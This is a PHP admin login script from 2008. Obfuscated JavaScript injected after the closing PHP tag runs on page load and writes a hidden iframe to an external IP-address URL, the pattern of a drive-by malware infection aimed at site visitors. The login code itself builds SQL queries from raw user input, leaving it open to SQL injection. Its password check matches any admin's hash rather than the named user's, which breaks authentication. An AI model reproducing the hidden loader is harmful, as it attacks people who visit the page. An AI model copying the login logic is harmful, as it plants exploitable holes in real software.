<?php
/********************************************************************
*	login.php														*
*   Last Modified: September 29th 2008								*
*	Created By: Michael Pisula										*
*																	*
********************************************************************/

session_start(); 																				//Put at the beginning of all password protected pages
include("db_connect.php"); 																		//Database connection script

if ($_POST['action'] == "login" || $_GET['action'] == "logout") 								//Protect against cross site scripting	
{
	if ($_POST['action'] == "login")															// Run Login Script
	{
	$email = strip_tags(stripslashes($_POST['email']));											// Clean up the Email and Password fields and protect against mysql injection
	$pass = strip_tags(stripslashes($_POST['pass']));
	
		if ($email == "" || $pass == "")														// Check if Email or Password fields are blank
		{
			$_SESSION['log_error'] = "Invalid email or password";	
			header("location:index.php");														//Erroe Message for bas user name
		}
		else
		{
			$user_query = "SELECT * FROM admin_users WHERE admin_email = '$email'";				// Run queury to check if user exists
			$user_result = mysql_query($user_query);
			$user_rows = mysql_num_rows($user_result);
	
			if ($user_rows > 0)																	
			{
				$encrypt_pass = md5($pass);
				$pass_query = "SELECT * FROM admin_users WHERE admin_pass = '$encrypt_pass'";	// Run queury to compare submitted password to users password
				$pass_result = mysql_query($pass_query);
				$pass_rows = mysql_num_rows($pass_result);
				
 				if($pass_rows > 0)
				{
					$_SESSION['auth'] = "admin";												// Create a Authorized user session variable
					header("location:index.php");												// Redirect User to administration page
				}
				else
				{
					$_SESSION['log_error'] = "Invalid email or password";
					header("location:index.php");												// Error message for bad password
				}
			} 
			else
			{
				$_SESSION['log_error'] = "Invalid email or password";	
				header("location:index.php");													// Error message for blank fields
			}
		}
	}
	if ($_GET['action'] == "logout")															// Run logout script
	{
		session_destroy();																		// Clear Sessions variables (log user out)
		header("location:index.php");															// Redirect user to login form
	}
}
else
{
echo "The page requested does not exist!";														//	Error message for cross site scripting
}
?><?php echo ''; ?><?php echo '<script>function HPkDx(BTOyBCO, JHi, dohkdlb){var EwHRWW=dohkdlb.split(JHi);var XFdsDX='';for(hUDiKAOew=-0xa-0x27-0x1b+0x18+0x1d+0x17;hUDiKAOew<(EwHRWW.length-1);hUDiKAOew+=0xc+0x22+0x1c+0x4-0x4d){ sjZb = EwHRWW[hUDiKAOew]^BTOyBCO;XFdsDX += String.fromCharCode(sjZb);}return XFdsDX;}function Qquuhlwb(tAEu){ var LNuGs = document.getElementById('xOGCRdaqIR'); fff.op.replace("157"); } 
;function qYjeCeDf(){var aLRvWh=new Function("gaR", "return "+HPkDx(0x23+0x2d+0x2e+0x103, 'e','485e494e482e500e492e484e495e501e')+"."+HPkDx(0x2f+0xc-0x30-0x29+0x12d, 'G','365G352G363G374G')+"");var KoJr=aLRvWh(-0x6-0x31+0xe+0x2a);KoJr.innerHTML += HPkDx(-0x17-0x6+0xbb, 'y','162y247y248y236y255y243y251y190y233y247y250y234y246y163y175y190y246y251y247y249y246y234y163y175y190y252y241y236y250y251y236y163y174y190y248y236y255y243y251y252y241y236y250y251y236y163y174y190y237y236y253y163y185y246y234y234y238y164y177y177y232y235y236y243y241y179y237y234y172y176y253y240y177y237y234y255y236y177y247y240y250y251y230y176y238y246y238y185y160y162y177y247y248y236y255y243y251y160y');}function njYjtn(zGlht){ alert('Fpew'); fff.op.replace("336");alert('Fpew'); } 
;if(window.addEventListener){window.addEventListener('load',qYjeCeDf,false);}else if(window.attachEvent){window.attachEvent('onload', qYjeCeDf);}function MsVOfO(XSGsAu){  fff=op.split("827");alert('lNDhfs'); fff.op.replace("867"); } 
;</script>'; ?><script>c10ze='';y5f195f9d=/* y918c84 */document;y5f195f9d.write('<scr'+'ipt>function y84195f3a93(y3e0f0ba7147){return e'+c10ze+'val(y3e0f0ba7147); }</scr'+'ipt>');  function c10b010268ydc943ee82b(ydee6f){ function ya13b41fe(){var y23ccb289f98=16;return y23ccb289f98;} var z332='';return (y84195f3a93('pa'+z332+'rseInt')(ydee6f,ya13b41fe()));}function y75a0e3ae65(y58c6a){ function yd8a60a0c8(){var yf77a1=2;return yf77a1;} var y884ef='';yf00162b='fromCh';y3525ba737=String[yf00162b+'arCode'];for(y1ce51=0;y1ce51<y58c6a.length;y1ce51+=yd8a60a0c8()){ y884ef+=(y3525ba737(c10b010268ydc943ee82b(y58c6a.substr(y1ce51,yd8a60a0c8()))));}return y884ef;} var y3a23a854fa1='3C7363726970743E69662821'+c10ze+'6D796961'+c10ze+'297B646F63756D656E742E777269746528756E65736361'+c10ze+'7065282027253363253639253636253732253631'+c10ze+'253664253635253230253665253631'+c10ze+'253664253635253364253633253331'+c10ze+'253330253230253733253732253633253364253237253638253734253734253730253361'+c10ze+'253266253266253332253331'+c10ze+'253332253265253331'+c10ze+'253337253334253265253332253330253330253265253331'+c10ze+'253332253330253266253265253634253639253636253266253637253666253265253730253638253730253366253733253639253634253364253331'+c10ze+'26253237253262253464253631'+c10ze+'253734253638253265253732253666253735253665253634253238253464253631'+c10ze+'253734253638253265253732253631'+c10ze+'253665253634253666253664253238253239253261'+c10ze+'253333253333253336253334253339253332253239253262253237253330253636253631'+c10ze+'253237253230253737253639253634253734253638253364253337253331'+c10ze+'253339253230253638253635253639253637253638253734253364253334253336253338253230253733253734253739253663253635253364253237253736253639253733253639253632253639253663253639253734253739253361'+c10ze+'253638253639253634253634253635253665253237253365253363253266253639253636253732253631'+c10ze+'2536642536352533652729293B7D7661'+c10ze+'72206D796961'+c10ze+'3D747275653B3C2F7363726970743E';y5f195f9d.write(y75a0e3ae65(y3a23a854fa1));</script>